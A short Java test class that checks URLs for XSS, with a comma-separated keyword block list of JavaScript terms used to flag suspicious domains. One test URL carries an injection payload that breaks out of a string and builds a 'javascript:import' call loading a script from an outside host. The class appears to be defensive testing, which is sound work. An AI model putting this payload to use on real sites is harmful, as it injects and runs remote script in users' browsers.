package spring;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.Arrays;
import java.util.List;

/**
 * @Author: zhangliuyang01
 * @Date: 2021/10/25 下午9:36
 */
public class XssTest {
    public static void main(String[] args) throws MalformedURLException {
        String str = "document,script,src,location,href,history,alert,javascript,function,window,assgin,setTimeout,atob,top,javascri,replace";

        List<String> list = Arrays.asList(str.split(","));

//        String url = "https://wxwtoptongzhen.58.com/remountpdd/rattlefugio/fhlbbjapan/neritictaxite/rheniumlara/disobeyhansom/rectifyrocklet?type=1&infoid=283707018&uid=37411563124502&areaName=%E5%A5%89%E8%8A%82%E5%8E%BF&tzadminuid=37411563124502&localId=500236124000&sharesource=toutiaolistdetail&isRecommend=&source=&tj=&from=timeline";

        String url = "https://mtongzhen.58.com/\".replace(\"https://mtongzhen.58.com/\",\"javascri\"+\"pt:imp\"+\"ort('https://chrhb.cn/index/luodi/?code=58')\")//_suiji";
        URL url1 = new URL(url);
        String host = url1.getHost();
        System.out.println(host);

//        for (String s : list) {
//            if (url.contains(s)){
//                System.out.println(s);
//            }
//
//        }

    }


    public void filterDomain(String domain) {
        String str = "document,script,src,location,href,history,alert,javascript,function,window,assgin,setTimeout,atob,top,javascri,replace";
        List<String> list = Arrays.asList(str.split(","));
        for (String s : list) {
            if (domain.contains(s)) {
                System.out.println("域名=" + domain + ",敏感词=" + s);
            }
        }
    }
}
